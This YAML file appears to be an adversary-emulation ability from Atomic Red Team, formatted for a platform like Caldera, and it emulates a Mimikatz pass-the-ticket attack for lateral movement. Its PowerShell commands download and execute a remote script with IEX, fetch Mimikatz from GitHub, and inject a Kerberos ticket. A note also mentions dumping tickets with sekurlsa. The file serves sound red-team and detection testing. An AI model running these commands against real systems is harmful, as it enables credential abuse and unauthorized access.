- id: dbf38128-7ba7-4776-bedf-cc2eed432098
  name: Mimikatz Kerberos Ticket Attack
  description: Similar to PTH, but attacking Kerberos
  tactic: lateral-movement
  technique:
    attack_id: T1550.003
    name: 'Use Alternate Authentication Material: Pass the Ticket'
  platforms:
    windows:
      sh:
        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe")
          {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
          = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
          -ErrorAction Ignore -Force | Out-Null; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"
          -UseBasicParsing); $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases";
          $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(".zip") }; $basePath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe"
          | Split-Path; Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath;
          fi; "PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe" "kerberos::ptt
          #{ticket}"'
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - lateral-movement
  - t1550.003
  author: Atomic Red Team
  additional_info:
    input_arguments:
      ticket:
        description: Ticket file name usually format of 'id-username\@domain.kirbi'
          (e.g. can be dumped by "sekurlsa::tickets /export" module)
        type: string
        default: null
      mimikatz_exe:
        description: Path of the Mimikatz binary
        type: path
        default: PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe
    dependencies:
    - description: 'Mimikatz must exist on disk at specified location (#{mimikatz_exe})

        '
      prereq_command: 'if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}

        '
      get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\
        New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction\
        \ Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"\
        \ -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\
        \n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url\
        \ | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\"\
        \ | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
    technique_created: '2020-01-30T17:03:43.072Z'
    atomic_guid: dbf38128-7ba7-4776-bedf-cc2eed432098
    import_timestamp: '2025-08-21T03:08:14.005924Z'
